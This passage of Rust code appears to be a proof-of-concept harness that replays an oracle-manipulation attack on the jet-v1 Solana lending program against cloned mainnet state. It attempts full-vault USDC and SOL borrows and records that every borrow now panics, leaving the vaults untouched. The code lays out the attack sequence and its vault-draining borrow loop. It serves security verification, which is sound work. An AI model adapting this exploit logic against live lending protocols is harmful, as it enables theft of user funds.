    if !ctx.send(&mut svm, &attacker, &ixs, "init_loan_account(SOL)", json!({})) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_init_loan_sol");
        return;
    }

    // ============================ Step 9: attempt the borrows ==========
    //
    // Historical context (verified below by the cloned program itself): until
    // 2022-11-10 this exact strategy would have drained both vaults. The deployed
    // program was upgraded LAST at slot 160,301,534 = 2022-11-10 12:43:29 UTC,
    // ~7h after the jet-v1 commit "disable borrows" (66991f4c8f14,
    // 2022-11-10 05:19:06 UTC), which inserted `panic!("disabled");` as the FIRST
    // statement of the borrow handler — exactly line 110, column 5 of
    // src/instructions/borrow.rs. The deployed ELF no longer contains the borrow
    // handler body strings (compiled away as unreachable), so every borrow call
    // panics before any state is read or any transfer happens.
    //
    // This run proves the block: the full-vault borrows and a matrix of degenerate
    // probes must all fail with the identical panic and leave every vault balance
    // untouched.
    let vault_usdc_pre = token_amount(&svm, &usdc.vault).unwrap_or(BORROW_USDC_FULL);
    let vault_sol_pre = token_amount(&svm, &sol.vault).unwrap_or(BORROW_SOL_FULL);
    ctx.log(format!(
        " vault balances before borrow attempts: USDC={vault_usdc_pre} SOL={vault_sol_pre}"
    ));
    ctx.log(" expected: every borrow reverts at src/instructions/borrow.rs:110:5 (borrow disabled)");

    let mut borrowed_usdc = 0u64;
    let mut borrowed_sol = 0u64;

    // --- unconditionality probes: amount 0/1, both reserves, no refresh, writable market ---
    for (label, r, loan, bump, amt, writable_market, with_refresh) in [
        ("probe borrow(USDC,1,no_refresh)", &usdc, loan_usdc, loan_usdc_bump, 1u64, false, false),
        ("probe borrow(USDC,0)", &usdc, loan_usdc, loan_usdc_bump, 0, false, true),
        ("probe borrow(USDC,1)", &usdc, loan_usdc, loan_usdc_bump, 1, false, true),
        ("probe borrow(SOL,1)", &sol, loan_sol, loan_sol_bump, 1, false, true),
        ("probe borrow(USDC,1,writable_market)", &usdc, loan_usdc, loan_usdc_bump, 1, true, true),
    ] {
        let receiver = if r.name == "SOL" { atk_wsol } else { atk_usdc };
        let mut ix = ix_borrow(r, obligation, attacker_pk, loan, receiver, bump, amt);
        if writable_market {
            ix.accounts[0] = AccountMeta::new(pk(MARKET), false);
        }
        let ixs = if with_refresh { vec![ix_refresh(r), ix] } else { vec![ix] };
        ctx.send(
            &mut svm,
            &attacker,
            &ixs,
            label,
            json!({"amount_raw": amt, "market_writable": writable_market, "with_refresh": with_refresh}),
        );
    }

    let step_try = |full: u64, attempts: u64, divisor: u64| -> Vec<u64> {
        let mut v = vec![full];
        if full > 1 {
            v.push(full - 1);
        }
        let step = (full / divisor).max(1);
        for i in 0..attempts {
            let a = full.saturating_sub(step.saturating_mul(i + 1));
            if a == 0 {
                break;
            }
            if !v.contains(&a) {
                v.push(a);
            }
        }
        v
    };

    // --- full-vault attempts with fallback (full, full-1, then 0.05% steps) ---
    for (r, loan, bump, receiver, full) in [
        (&usdc, loan_usdc, loan_usdc_bump, atk_usdc, vault_usdc_pre),
        (&sol, loan_sol, loan_sol_bump, atk_wsol, vault_sol_pre),
    ] {
        for amt in step_try(full, 3, 2000) {
            let ixs = vec![
                ix_refresh(r),
                ix_borrow(r, obligation, attacker_pk, loan, receiver, bump, amt),
            ];
            let ok = ctx.send(
                &mut svm,
                &attacker,
                &ixs,
                &format!("borrow({}, {amt})", r.name),
                json!({"amount_raw": amt, "reserve": r.name}),
            );
            if ok {
                if r.name == "USDC" {
                    borrowed_usdc = amt;
                } else {
                    borrowed_sol = amt;
                }
                break;
            }
        }
    }

    // ============================ Final state ============================
    let post = json!({
        "market": market_cache(&svm),
        "attacker_usdc_raw": token_amount(&svm, &atk_usdc),
        "attacker_sol_raw": token_amount(&svm, &atk_wsol),
        "attacker_sol_eth_left_raw": token_amount(&svm, &atk_sol_eth),
        "attacker_native_lamports": svm.get_account(&attacker_pk).map(|a| a.lamports),
        "vault_usdc_raw": token_amount(&svm, &usdc.vault),
        "vault_sol_raw": token_amount(&svm, &sol.vault),
        "vault_sol_eth_raw": token_amount(&svm, &sol_eth.vault),
        "deposit_notes_raw": token_amount(&svm, &deposit_account),
        "collateral_notes_raw": token_amount(&svm, &collateral_account),
        "loan_notes_usdc_raw": token_amount(&svm, &loan_usdc),
        "loan_notes_sol_raw": token_amount(&svm, &loan_sol),
    });

    let attacker_usdc = token_amount(&svm, &atk_usdc).unwrap_or(0);
    let attacker_sol = token_amount(&svm, &atk_wsol).unwrap_or(0);
    let vault_usdc_post = token_amount(&svm, &usdc.vault).unwrap_or(0);
    let vault_sol_post = token_amount(&svm, &sol.vault).unwrap_or(0);

    // Count borrow-like steps: total sent, and how many failed with the disabled-borrow panic.
    let mut borrow_steps_total = 0u64;
    let mut blocked_signature_hits = 0u64;
    for s in &ctx.steps {
        let is_borrow_like = s["step"]
            .as_str()
            .map(|x| x.starts_with("borrow(") || x.starts_with("probe borrow("))
            .unwrap_or(false);
        if !is_borrow_like {
            continue;
        }
        borrow_steps_total += 1;
        let failed = s["ok"] == json!(false);
        let sig = s["logs_tail"]
            .as_array()
            .map(|logs| {
                logs.iter()
                    .any(|l| l.as_str().map(|x| x.contains("src/instructions/borrow.rs:110:5")).unwrap_or(false))
            })
            .unwrap_or(false);
        if failed && sig {
            blocked_signature_hits += 1;
        }
    }

    let extracted = borrowed_usdc > 0 || borrowed_sol > 0;
    let no_funds_moved =
        attacker_usdc == 0 && attacker_sol == 0 && vault_usdc_post == vault_usdc_pre && vault_sol_post == vault_sol_pre;
    let all_blocked = borrow_steps_total > 0 && blocked_signature_hits == borrow_steps_total;
    let status = if extracted {
        "pass"
    } else if no_funds_moved && all_blocked {
        "blocked_borrow_disabled"
    } else {
        "inconclusive"
    };
    ctx.log(format!(
        " borrow-like steps: {borrow_steps_total}, all failed with borrow.rs:110:5 panic: {all_blocked}; no funds moved: {no_funds_moved}"
    ));
    ctx.log(format!(
        " vault balances after borrow attempts: USDC={vault_usdc_post} SOL={vault_sol_post} (unchanged={})",
        vault_usdc_post == vault_usdc_pre && vault_sol_post == vault_sol_pre
    ));

    let spent_sol_eth = DEPOSIT_SOL_ETH_RAW as f64 / 1e6;
    let hypothetical_cost_usd = spent_sol_eth * REAL_SOL_ETH_USD;
    let would_have_borrowed_usd_oracle =
        vault_usdc_pre as f64 / 1e6 * PRICE_USDC + vault_sol_pre as f64 / 1e9 * PRICE_SOL;

    let summary = json!({
        "attack": "jet-v1 frozen solETH Pyth oracle -> deposit collateral, borrow the full USDC+SOL vaults",
        "status": status,
        "outcome_summary": if extracted {
            "ATTACK SUCCEEDED: vaults drained via borrow"
        } else if status == "blocked_borrow_disabled" {
            "ATTACK BLOCKED: the deployed program panics unconditionally at the start of the borrow handler (src/instructions/borrow.rs:110:5); no debt can be created and no vault funds can be withdrawn via borrow"
        } else {
            "INCONCLUSIVE: borrows failed but not with the expected disabled-borrow signature"
        },
        "accounts_json_slot": state.slot,
        "clock_slot": CLOCK_SLOT,
        "clock_unix_timestamp": CLOCK_TS,
        "pre": ctx.pre.clone(),
        "post": post,
        "vault_usdc_before_raw": vault_usdc_pre,
        "vault_sol_before_raw": vault_sol_pre,
        "vault_usdc_after_raw": vault_usdc_post,
        "vault_sol_after_raw": vault_sol_post,
        "attacker_usdc_raw": attacker_usdc,
        "attacker_sol_raw": attacker_sol,
        "borrowed_usdc_raw": borrowed_usdc,
        "borrowed_sol_raw": borrowed_sol,
        "would_have_borrowed": {
            "usdc_raw": vault_usdc_pre,
            "sol_raw": vault_sol_pre,
            "usd_at_oracle": would_have_borrowed_usd_oracle,
            "note": "amount the pre-2022-11-10 program would have let the attacker borrow; NOT extractable now"
        },
        "oracle_prices": {"USDC": PRICE_USDC, "SOL": PRICE_SOL, "solETH": PRICE_SOL_ETH},
        "cost_estimate": {
            "note": "hypothetical cost of the buy-solETH leg under the pre-disable program; nothing was extracted in this run",
            "sol_eth_spent_raw": DEPOSIT_SOL_ETH_RAW,
            "sol_eth_usd_at_real_298": hypothetical_cost_usd,
            "gas_and_rent_sol_note": "attacker started with 10 native SOL; only fees/rent consumed"
        },
        "block_evidence": {
            "kind": "borrow instruction hard-disabled in the deployed program",
            "panic_location": "src/instructions/borrow.rs:110:5",
            "panic_observed_on": "every borrow attempt: amount 0 / 1 / full vault, USDC and SOL reserves, with and without refresh_reserve in the same tx, market read-only or writable",
            "disable_commit": "66991f4c8f14 (jet-v1 repo mirror: judithjr/jet-v1 branch no-borrows)",
            "disable_commit_message": "disable borrows",
            "disable_commit_time_utc": "2022-11-10T05:19:06Z",
            "onchain_last_upgrade_slot": 160301534u64,
            "onchain_last_upgrade_time_utc": "2022-11-10T12:43:29Z",
            "elf_check": "handler body string 'Requested a debt that would exceed the maximum potential supply for a token.' is absent from the deployed ELF (dead code eliminated after the panic); the panic Location struct (borrow.rs, line 110 col 5) is present in rodata",
            "interpretation": "no external attacker can borrow from this market; the USDC/SOL/solETH vaults remain but cannot be extracted through the borrow path"
        },
        "notes": [
            "all accounts cloned from mainnet into analysis/accounts.json; no RPC used while running this PoC",
            "refresh_reserve is iterative (one week of interest per call); the PoC loops it until the market cache is valid before each dependent instruction",
            "PDA seeds verified against live on-chain data (1,200 obligations, 2,132 positions)",
            "account metas come from the deployed IDL v0.2.0 / jet-proto-v1-cpi 0.23.0",
            "the pre-disable attack path is fully reproduced up to the borrow: refresh, obligation, deposit, collateral all succeed on cloned state",
        ],
    });

    finalize(&ctx, &out_dir, &svm, summary, status);
}

/// Writes results + log and exits. Exit code 0 = conclusive outcome (attack
/// succeeded, or provably blocked); 1 = inconclusive/internal failure.
fn finalize(ctx: &Ctx, out_dir: &PathBuf, svm: &LiteSVM, extra: Value, status: &str) {
    let mut summary = extra;
    if !summary.is_object() {
        summary = json!({});
    }
    summary["runner_status"] = json!(status);
    summary["steps"] = Value::Array(ctx.steps.clone());
    summary["pre"] = ctx.pre.clone();
    summary["final_market_cache"] = market_cache(svm);

    fs::write(
        out_dir.join("poc_results.json"),
        serde_json::to_vec_pretty(&summary).unwrap(),
    )
    .expect("write poc_results.json");
    let mut log = ctx.lines.join("\n");
    log.push_str(&format!("\n\n=== RESULT: {status} ===\n"));
    fs::write(out_dir.join("poc_log.txt"), log).expect("write poc_log.txt");

    println!("\n=== RESULT: {status} ===");
    println!("results written to {}", out_dir.join("poc_results.json").display());

    if status == "pass" || status == "blocked_borrow_disabled" {
        std::process::exit(0);
    } else {
        std::process::exit(1);
    }
}
